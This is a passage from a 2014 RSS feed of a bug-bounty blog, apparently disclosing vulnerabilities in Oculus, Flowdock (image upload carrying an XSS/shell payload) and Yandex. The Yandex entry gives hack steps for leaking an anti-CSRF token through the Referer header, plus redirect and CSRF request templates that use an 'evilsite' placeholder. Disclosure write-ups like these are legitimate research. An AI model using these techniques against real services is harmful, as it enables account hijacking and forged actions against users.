  &lt;li&gt;If the victim clicks that link his password will be changed!&lt;/li&gt;
&lt;/ul&gt;
</description>
        <pubDate>Fri, 15 Aug 2014 00:00:00 +0200</pubDate>
        <link>http://maradrianbelen.com/articles/2014-08/OCULUS-VR-account-hijacking!-via-password-reset-vulnerability</link>
        <guid isPermaLink="true">http://maradrianbelen.com/articles/2014-08/OCULUS-VR-account-hijacking!-via-password-reset-vulnerability</guid>
        
        
        <category>Logic Flaw</category>
        
        <category>Hijacking</category>
        
      </item>
    
      <item>
        <title>Flowdock XSS or RCE(malicious file upload)</title>
        <description>&lt;p&gt;One day I accidentally uploaded a .pdf filetype on https://www.flowdock.com/oauth/applications page. it was successfully uploaded. So I tried to upload some arbitrary filetype, But flowdock rejected it. Flowdock backlisted all arbitrary content-type such as text/HTML, application/x-asp, application/x-perl. ‚Ä¶ etc.. and flowdock also checked the signature of a file that used to identify if the file is a real image or not.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Error message when I tried to upload a shell!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://2.bp.blogspot.com/-P21qQh5Oytc/U9NgEyXweRI/AAAAAAAAAPg/EnoMY0H5CXw/s1600/1.png&quot; alt=&quot;ohh&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;If we want to upload our shell or HTML-XSS PoC, we need to upload a real image that contains our XSS/RCE payload. I changed the EXIF header of the image and upload the file.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://1.bp.blogspot.com/-gsbzUjnYGmY/U9NgGaYF46I/AAAAAAAAAPo/hB4MN-rQCBc/s1600/2.png&quot; alt=&quot;ohh&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;result&quot;&gt;RESULT:&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;http://2.bp.blogspot.com/-mnaUU_-6PTU/U9NgG4o4c-I/AAAAAAAAAP0/oDSsBwRqDTM/s1600/3.png&quot; alt=&quot;ohh&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://1.bp.blogspot.com/-bpdH-nN4tYk/U9NgKLSwt1I/AAAAAAAAAP8/hGoi7rihJN0/s1600/4.png&quot; alt=&quot;ohh&quot; /&gt;
## YEHH!&lt;/p&gt;
</description>
        <pubDate>Sat, 26 Jul 2014 00:00:00 +0200</pubDate>
        <link>http://maradrianbelen.com/articles/2014-07/Flowdock-XSS-or-RCE</link>
        <guid isPermaLink="true">http://maradrianbelen.com/articles/2014-07/Flowdock-XSS-or-RCE</guid>
        
        
        <category>XSS</category>
        
        <category>Malicious file upload</category>
        
      </item>
    
      <item>
        <title>Bypass anti CSRF token of Yandex!</title>
        <description>&lt;p&gt;When you browse a link in docviewer.yandex.com, The site will recreate a token named sk, which is used to validate a redirection and anti-csrf token. sk is also an anti-CSRF token on &lt;code class=&quot;highlighter-rouge&quot;&gt;http://webmaster.yandex.ru, https://docviewer.yandex.com/r.xml&lt;/code&gt;. now If the attacker knows the value of your sk token, he can make a redirection and CSRF attack. How to know the token of the victim ???. Because &lt;code class=&quot;highlighter-rouge&quot;&gt;http://docviewer.yandex.com/r.xml?sk=thecsrftokenofvictim&amp;amp;url=evilsite&lt;/code&gt; useD GET request, the params are showed in URL and it also changeable to https to HTTP. as a result, you can use REFERER HEADER to get the token.&lt;/p&gt;

&lt;h3 id=&quot;hack-steps&quot;&gt;HACK STEPS&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;Upload a document with link or a hyperlink. that hyperlink is the attacker‚Äôs site..&lt;/li&gt;
  &lt;li&gt;Select the file, Share the link using the share button then get the link&lt;/li&gt;
  &lt;li&gt;Browse that link, Then click the view button you will redirect to docviewer.yandex.com&lt;/li&gt;
  &lt;li&gt;Change the https to http to allow us to see the referer in our site.&lt;/li&gt;
&lt;/ul&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt; 
https://docviewer.yandex.com/?url=ya-disk-public://nhP6POxtEi4v9wDffRyOFHbGQgIOhlsEbLhl3zH9c7k%3D&amp;amp;name=testxxx.odt to http://docviewer.yandex.com/?url=ya-disk-public://nhP6POxtEi4v9wDffRyOFHbGQgIOhlsEbLhl3zH9c7k%3D&amp;amp;name=testxxx.odt&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;ul&gt;
  &lt;li&gt;Send the url to victim and induce him to click the link for attacker‚Äôsite to able to leak the anti-CSRF token.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;now you have his &lt;code class=&quot;highlighter-rouge&quot;&gt;sk&lt;/code&gt; token! that is the bypass!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;for redirection&lt;/strong&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt; 
 https://docviewer.yandex.com/r.xml?sk=thecsrftokenofvictim&amp;amp;url=evilsite
 &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;for csrf&lt;/strong&gt; ‚Üí&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;http://webmaster.yandex.com/settings/messages/types.xml?email_1=EMAIL&amp;amp;email_2=EMAIL&amp;amp;message_3=MESSAGE&amp;amp;email_3=EMAIL&amp;amp;message_4=MESSAGE&amp;amp;percent=50&amp;amp;message_5=MESSAGE&amp;amp;message_6=MESSAGE&amp;amp;message_7=MESSAGE&amp;amp;message_8=MESSAGE&amp;amp;email_8=EMAIL&amp;amp;message_9=MESSAGE&amp;amp;message_10=MESSAGE&amp;amp;message_12=MESSAGE&amp;amp;message_17=MESSAGE&amp;amp;message_18=MESSAGE&amp;amp;message_19=MESSAGE&amp;amp;email_19=EMAIL&amp;amp;message_21=MESSAGE&amp;amp;email_21=EMAIL&amp;amp;message_22=MESSAGE&amp;amp;email_22=EMAIL&amp;amp;message_32=MESSAGE&amp;amp;do=save&amp;amp;sk=TOKENOFVICTIM&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;This is wide CSRF attack which affect other Yandex domain.&lt;/strong&gt;&lt;/p&gt;

&lt;h3 id=&quot;list-of-affected-yandex-domain&quot;&gt;list of affected Yandex domain&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;http://appmetrica.yandex.com/&lt;/li&gt;
  &lt;li&gt;https://calendar.yandex.ru&lt;/li&gt;
  &lt;li&gt;https://disk.yandex.com/&lt;/li&gt;
  &lt;li&gt;docviewer.yandex.com&lt;/li&gt;
  &lt;li&gt;m.contact.yandex.com.tr &amp;amp; etc&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;em&gt;NOTE: i used javascript code to get the leaked csrf token on refrerer header and append it to my CSRF PoC.&lt;/em&gt;&lt;/p&gt;
</description>
        <pubDate>Wed, 07 May 2014 00:00:00 +0200</pubDate>
        <link>http://maradrianbelen.com/articles/2014-05/leaking-anti-CSRF-token-of-yandex!</link>
        <guid isPermaLink="true">http://maradrianbelen.com/articles/2014-05/leaking-anti-CSRF-token-of-yandex!</guid>
        
        
        <category>Info Leakage</category>
        
        <category>CSRF</category>
        
      </item>
    
  </channel>
</rss>
